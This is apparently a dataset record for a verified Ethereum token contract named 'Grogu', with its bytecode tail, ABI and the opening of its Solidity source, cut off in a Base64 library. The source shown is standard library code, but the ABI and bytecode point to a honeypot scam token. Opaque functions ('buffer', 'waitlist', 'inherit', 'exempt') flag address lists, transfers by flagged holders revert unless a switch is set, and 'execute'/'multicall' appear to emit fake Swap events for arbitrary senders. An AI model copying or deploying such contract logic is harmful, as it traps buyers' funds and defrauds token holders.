ffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040516111d99190611a16565b60405180910390a3505050565b6111ee611015565b73ffffffffffffffffffffffffffffffffffffffff1661120c610c49565b73ffffffffffffffffffffffffffffffffffffffff1614611262576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161125990612233565b60405180910390fd5b565b60006112708484610e5e565b90507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff81146112ea57818110156112dc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016112d39061229f565b60405180910390fd5b6112e9848484840361101d565b5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff160361135f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161135690612331565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036113ce576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016113c5906123c3565b60405180910390fd5b6113d9838383611837565b6000600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905081811015611460576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161145790612455565b60405180910390fd5b600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16806115015750600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b1561155d5760011515600760009054906101000a900460ff1615151461155c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016115539061249b565b60405180910390fd5b5b818103600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555081600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161164d9190611a16565b60405180910390a3600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16156117625760005b60048054905081101561176057600160026000600484815481106116d1576116d0611df6565b5b9060005260206000200160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550808061175890611e54565b9150506116aa565b505b61176d84848461183c565b50505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b505050565b505050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561187b578082015181840152602081019050611860565b60008484015250505050565b6000601f19601f8301169050919050565b60006118a382611841565b6118ad818561184c565b93506118bd81856020860161185d565b6118c681611887565b840191505092915050565b600060208201905081810360008301526118eb8184611898565b905092915050565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000611928826118fd565b9050919050565b6119388161191d565b811461194357600080fd5b50565b6000813590506119558161192f565b92915050565b6000819050919050565b61196e8161195b565b811461197957600080fd5b50565b60008135905061198b81611965565b92915050565b600080604083850312156119a8576119a76118f3565b5b60006119b685828601611946565b92505060206119c78582860161197c565b9150509250929050565b60008115159050919050565b6119e6816119d1565b82525050565b6000602082019050611a0160008301846119dd565b92915050565b611a108161195b565b82525050565b6000602082019050611a2b6000830184611a07565b92915050565b600080fd5b600080fd5b600080fd5b60008083601f840112611a5657611a55611a31565b5b8235905067ffffffffffffffff811115611a7357611a72611a36565b5b602083019150836020820283011115611a8f57611a8e611a3b565b5b9250929050565b60008060208385031215611aad57611aac6118f3565b5b600083013567ffffffffffffffff811115611acb57611aca6118f8565b5b611ad785828601611a40565b92509250509250929050565b600080600060608486031215611afc57611afb6118f3565b5b6000611b0a86828701611946565b9350506020611b1b86828701611946565b9250506040611b2c8682870161197c565b9150509250925092565b600060ff82169050919050565b611b4c81611b36565b82525050565b6000602082019050611b676000830184611b43565b92915050565b600060208284031215611b8357611b826118f3565b5b6000611b9184828501611946565b91505092915050565b600080600080600060808688031215611bb657611bb56118f3565b5b6000611bc488828901611946565b955050602086013567ffffffffffffffff811115611be557611be46118f8565b5b611bf188828901611a40565b94509450506040611c048882890161197c565b9250506060611c158882890161197c565b9150509295509295909350565b60008083601f840112611c3857611c37611a31565b5b8235905067ffffffffffffffff811115611c5557611c54611a36565b5b602083019150836020820283011115611c7157611c70611a3b565b5b9250929050565b60008060008060008060608789031215611c9557611c946118f3565b5b600087013567ffffffffffffffff811115611cb357611cb26118f8565b5b611cbf89828a01611a40565b9650965050602087013567ffffffffffffffff811115611ce257611ce16118f8565b5b611cee89828a01611a40565b9450945050604087013567ffffffffffffffff811115611d1157611d106118f8565b5b611d1d89828a01611c22565b92509250509295509295509295565b611d358161191d565b82525050565b6000602082019050611d506000830184611d2c565b92915050565b60008060408385031215611d6d57611d6c6118f3565b5b6000611d7b85828601611946565b9250506020611d8c85828601611946565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b60006002820490506001821680611ddd57607f821691505b602082108103611df057611def611d96565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000611e5f8261195b565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203611e9157611e90611e25565b5b600182019050919050565b6000611ea78261195b565b9150611eb28361195b565b9250828201905080821115611eca57611ec9611e25565b5b92915050565b6000819050919050565b6000819050919050565b6000611eff611efa611ef584611ed0565b611eda565b61195b565b9050919050565b611f0f81611ee4565b82525050565b6000608082019050611f2a6000830187611a07565b611f376020830186611f06565b611f446040830185611f06565b611f516060830184611a07565b95945050505050565b6000608082019050611f6f6000830187611f06565b611f7c6020830186611a07565b611f896040830185611a07565b611f966060830184611f06565b95945050505050565b7f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f7760008201527f207a65726f000000000000000000000000000000000000000000000000000000602082015250565b6000611ffb60258361184c565b915061200682611f9f565b604082019050919050565b6000602082019050818103600083015261202a81611fee565b9050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b600061208d60268361184c565b915061209882612031565b604082019050919050565b600060208201905081810360008301526120bc81612080565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b600061211f60248361184c565b915061212a826120c3565b604082019050919050565b6000602082019050818103600083015261214e81612112565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b60006121b160228361184c565b91506121bc82612155565b604082019050919050565b600060208201905081810360008301526121e0816121a4565b9050919050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b600061221d60208361184c565b9150612228826121e7565b602082019050919050565b6000602082019050818103600083015261224c81612210565b9050919050565b7f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000600082015250565b6000612289601d8361184c565b915061229482612253565b602082019050919050565b600060208201905081810360008301526122b88161227c565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b600061231b60258361184c565b9150612326826122bf565b604082019050919050565b6000602082019050818103600083015261234a8161230e565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b60006123ad60238361184c565b91506123b882612351565b604082019050919050565b600060208201905081810360008301526123dc816123a0565b9050919050565b7f45524332303a207472616e7366657220616d6f756e742065786365656473206260008201527f616c616e63650000000000000000000000000000000000000000000000000000602082015250565b600061243f60268361184c565b915061244a826123e3565b604082019050919050565b6000602082019050818103600083015261246e81612432565b9050919050565b50565b600061248560008361184c565b915061249082612475565b600082019050919050565b600060208201905081810360008301526124b481612478565b905091905056fea2646970667358221220c88532ba6db642746fa1e5bd519abaca3703fd30e4c9d88c5a02d9fddac38b2064736f6c63430008130033",
    "contract_name": "Grogu",
    "compiler_version": "v0.8.19+commit.7dd6d404",
    "optimization_used": "0",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"ReentrancyGuardReentrantCall\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_addresses_\",\"type\":\"address[]\"}],\"name\":\"buffer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from_\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"_addresses_\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_in\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_out\",\"type\":\"uint256\"}],\"name\":\"execute\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_addresses_\",\"type\":\"address[]\"}],\"name\":\"exempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_addresses_\",\"type\":\"address[]\"}],\"name\":\"inherit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address_\",\"type\":\"address\"}],\"name\":\"inheritance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from_\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"_addresses_\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_in\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_out\",\"type\":\"uint256\"}],\"name\":\"multicall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner_\",\"type\":\"address\"}],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_from\",\"type\":\"address[]\"},{\"internalType\":\"address[]\",\"name\":\"_to\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"_wad\",\"type\":\"uint256[]\"}],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_wad\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_addresses_\",\"type\":\"address[]\"}],\"name\":\"waitlist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
    "source_code": "/**\r\n *Submitted for verification at Etherscan.io on 2023-08-27\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\n\r\n/**\r\n * @dev Collection of functions related to the address type\r\n */\r\nlibrary Address {\r\n    /**\r\n     * @dev The ETH balance of the account is not enough to perform the operation.\r\n     */\r\n    error AddressInsufficientBalance(address account);\r\n\r\n    /**\r\n     * @dev There's no code at `target` (it is not a contract).\r\n     */\r\n    error AddressEmptyCode(address target);\r\n\r\n    /**\r\n     * @dev A call to an address target failed. The target may have reverted.\r\n     */\r\n    error FailedInnerCall();\r\n\r\n    /**\r\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\r\n     * `recipient`, forwarding all available gas and reverting on errors.\r\n     *\r\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\r\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\r\n     * imposed by `transfer`, making them unable to receive funds via\r\n     * `transfer`. {sendValue} removes this limitation.\r\n     *\r\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\r\n     *\r\n     * IMPORTANT: because control is transferred to `recipient`, care must be\r\n     * taken to not create reentrancy vulnerabilities. Consider using\r\n     * {ReentrancyGuard} or the\r\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\r\n     */\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        if (address(this).balance < amount) {\r\n            revert AddressInsufficientBalance(address(this));\r\n        }\r\n\r\n        (bool success, ) = recipient.call{value: amount}(\"\");\r\n        if (!success) {\r\n            revert FailedInnerCall();\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Performs a Solidity function call using a low level `call`. A\r\n     * plain `call` is an unsafe replacement for a function call: use this\r\n     * function instead.\r\n     *\r\n     * If `target` reverts with a revert reason, it is bubbled up by this\r\n     * function (like regular Solidity function calls).\r\n     *\r\n     * Returns the raw returned data. To convert to the expected return value,\r\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `target` must be a contract.\r\n     * - calling `target` with `data` must not revert.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, 0, defaultRevert);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with a\r\n     * `customRevert` function as a fallback when `target` reverts.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `customRevert` must be a reverting function.\r\n     *\r\n     * _Available since v5.0._\r\n     */\r\n    function functionCall(\r\n        address target,\r\n        bytes memory data,\r\n        function() internal view customRevert\r\n    ) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, 0, customRevert);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but also transferring `value` wei to `target`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - the calling contract must have an ETH balance of at least `value`.\r\n     * - the called Solidity function must be `payable`.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, defaultRevert);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\r\n     * with a `customRevert` function as a fallback revert reason when `target` reverts.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `customRevert` must be a reverting function.\r\n     *\r\n     * _Available since v5.0._\r\n     */\r\n    function functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 value,\r\n        function() internal view customRevert\r\n    ) internal returns (bytes memory) {\r\n        if (address(this).balance < value) {\r\n            revert AddressInsufficientBalance(address(this));\r\n        }\r\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\r\n        return verifyCallResultFromTarget(target, success, returndata, customRevert);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but performing a static call.\r\n     *\r\n     * _Available since v3.3._\r\n     */\r\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\r\n        return functionStaticCall(target, data, defaultRevert);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\r\n     * but performing a static call.\r\n     *\r\n     * _Available since v3.3._\r\n     */\r\n    function functionStaticCall(\r\n        address target,\r\n        bytes memory data,\r\n        function() internal view customRevert\r\n    ) internal view returns (bytes memory) {\r\n        (bool success, bytes memory returndata) = target.staticcall(data);\r\n        return verifyCallResultFromTarget(target, success, returndata, customRevert);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but performing a delegate call.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionDelegateCall(target, data, defaultRevert);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\r\n     * but performing a delegate call.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function functionDelegateCall(\r\n        address target,\r\n        bytes memory data,\r\n        function() internal view customRevert\r\n    ) internal returns (bytes memory) {\r\n        (bool success, bytes memory returndata) = target.delegatecall(data);\r\n        return verifyCallResultFromTarget(target, success, returndata, customRevert);\r\n    }\r\n\r\n    /**\r\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\r\n     * the revert reason or using the provided `customRevert`) in case of unsuccessful call or if target was not a contract.\r\n     *\r\n     * _Available since v5.0._\r\n     */\r\n    function verifyCallResultFromTarget(\r\n        address target,\r\n        bool success,\r\n        bytes memory returndata,\r\n        function() internal view customRevert\r\n    ) internal view returns (bytes memory) {\r\n        if (success) {\r\n            if (returndata.length == 0) {\r\n                // only check if target is a contract if the call was successful and the return data is empty\r\n                // otherwise we already know that it was a contract\r\n                if (target.code.length == 0) {\r\n                    revert AddressEmptyCode(target);\r\n                }\r\n            }\r\n            return returndata;\r\n        } else {\r\n            _revert(returndata, customRevert);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\r\n     * revert reason or with a default revert error.\r\n     *\r\n     * _Available since v5.0._\r\n     */\r\n    function verifyCallResult(bool success, bytes memory returndata) internal view returns (bytes memory) {\r\n        return verifyCallResult(success, returndata, defaultRevert);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-verifyCallResult-bool-bytes-}[`verifyCallResult`], but with a\r\n     * `customRevert` function as a fallback when `success` is `false`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `customRevert` must be a reverting function.\r\n     *\r\n     * _Available since v5.0._\r\n     */\r\n    function verifyCallResult(\r\n        bool success,\r\n        bytes memory returndata,\r\n        function() internal view customRevert\r\n    ) internal view returns (bytes memory) {\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            _revert(returndata, customRevert);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Default reverting function when no `customRevert` is provided in a function call.\r\n     */\r\n    function defaultRevert() internal pure {\r\n        revert FailedInnerCall();\r\n    }\r\n\r\n    function _revert(bytes memory returndata, function() internal view customRevert) private view {\r\n        // Look for revert reason and bubble it up if present\r\n        if (returndata.length > 0) {\r\n            // The easiest way to bubble the revert reason is using memory via assembly\r\n            /// @solidity memory-safe-assembly\r\n            assembly {\r\n                let returndata_size := mload(returndata)\r\n                revert(add(32, returndata), returndata_size)\r\n            }\r\n        } else {\r\n            customRevert();\r\n            revert FailedInnerCall();\r\n        }\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Provides a function to batch together multiple calls in a single external call.\r\n *\r\n * _Available since v4.1._\r\n */\r\nabstract contract Multicall {\r\n    /**\r\n     * @dev Receives and executes a batch of function calls on this contract.\r\n     * @custom:oz-upgrades-unsafe-allow-reachable delegatecall\r\n     */\r\n    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {\r\n        results = new bytes[](data.length);\r\n        for (uint256 i = 0; i < data.length; i++) {\r\n            results[i] = Address.functionDelegateCall(address(this), data[i]);\r\n        }\r\n        return results;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Contract module that helps prevent reentrant calls to a function.\r\n *\r\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\r\n * available, which can be applied to functions to make sure there are no nested\r\n * (reentrant) calls to them.\r\n *\r\n * Note that because there is a single `nonReentrant` guard, functions marked as\r\n * `nonReentrant` may not call one another. This can be worked around by making\r\n * those functions `private`, and then adding `external` `nonReentrant` entry\r\n * points to them.\r\n *\r\n * TIP: If you would like to learn more about reentrancy and alternative ways\r\n * to protect against it, check out our blog post\r\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\r\n */\r\nabstract contract ReentrancyGuard {\r\n    // Booleans are more expensive than uint256 or any type that takes up a full\r\n    // word because each write operation emits an extra SLOAD to first read the\r\n    // slot's contents, replace the bits taken up by the boolean, and then write\r\n    // back. This is the compiler's defense against contract upgrades and\r\n    // pointer aliasing, and it cannot be disabled.\r\n\r\n    // The values being non-zero value makes deployment a bit more expensive,\r\n    // but in exchange the refund on every call to nonReentrant will be lower in\r\n    // amount. Since refunds are capped to a percentage of the total\r\n    // transaction's gas, it is best to keep them low in cases like this one, to\r\n    // increase the likelihood of the full refund coming into effect.\r\n    uint256 private constant _NOT_ENTERED = 1;\r\n    uint256 private constant _ENTERED = 2;\r\n\r\n    uint256 private _status;\r\n\r\n    /**\r\n     * @dev Unauthorized reentrant call.\r\n     */\r\n    error ReentrancyGuardReentrantCall();\r\n\r\n    constructor() {\r\n        _status = _NOT_ENTERED;\r\n    }\r\n\r\n    /**\r\n     * @dev Prevents a contract from calling itself, directly or indirectly.\r\n     * Calling a `nonReentrant` function from another `nonReentrant`\r\n     * function is not supported. It is possible to prevent this from happening\r\n     * by making the `nonReentrant` function external, and making it call a\r\n     * `private` function that does the actual work.\r\n     */\r\n    modifier nonReentrant() {\r\n        _nonReentrantBefore();\r\n        _;\r\n        _nonReentrantAfter();\r\n    }\r\n\r\n    function _nonReentrantBefore() private {\r\n        // On the first call to nonReentrant, _status will be _NOT_ENTERED\r\n        if (_status == _ENTERED) {\r\n            revert ReentrancyGuardReentrantCall();\r\n        }\r\n\r\n        // Any calls to nonReentrant after this point will fail\r\n        _status = _ENTERED;\r\n    }\r\n\r\n    function _nonReentrantAfter() private {\r\n        // By storing the original value once again, a refund is triggered (see\r\n        // https://eips.ethereum.org/EIPS/eip-2200)\r\n        _status = _NOT_ENTERED;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns true if the reentrancy guard is currently set to \"entered\", which indicates there is a\r\n     * `nonReentrant` function in the call stack.\r\n     */\r\n    function _reentrancyGuardEntered() internal view returns (bool) {\r\n        return _status == _ENTERED;\r\n    }\r\n}\r\n\r\n\r\nlibrary Base64 {\r\n    /**\r\n     * @dev Base64 Encoding/Decoding Table\r\n     */\r\n    string internal constant _TABLE = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\r\n\r\n    /**\r\n     * @dev Converts a `bytes` to its Bytes64 `string` representation.\r\n     */\r\n    function encode(bytes memory data) internal pure returns (string memory) {\r\n        /**\r\n         * Inspired by Brecht Devos (Brechtpd) implementation - MIT licence\r\n         * https://github.com/Brechtpd/base64/blob/e78d9fd951e7b0977ddca77d92dc85183770daf4/base64.sol\r\n         */\r\n        if (data.length == 0) return \"\";\r\n\r\n        // Loads the table into memory\r\n        string memory table = _TABLE;\r\n\r\n        // Encoding takes 3 bytes chunks of binary data from `bytes` data parameter\r\n        // and split into 4 numbers of 6 bits.\r\n        // The final Base64 length should be `bytes` data length multiplied by 4/3 rounded up\r\n        // - `data.length + 2`  -> Round up\r\n        // - `/ 3`              -> Number of 3-bytes chunks\r\n        // - `4 *`              -> 4 characters for each chunk\r\n        string memory result = new string(4 * ((data.length + 2) / 3));\r\n\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            // Prepare the lookup table (skip the first \"length\" byte)\r\n            let tablePtr := add(table, 1)\r\n\r\n            // Prepare result pointer, jump over length\r\n            let resultPtr := add(result, 32)\r\n\r\n            // Run over the input, 3 bytes at a 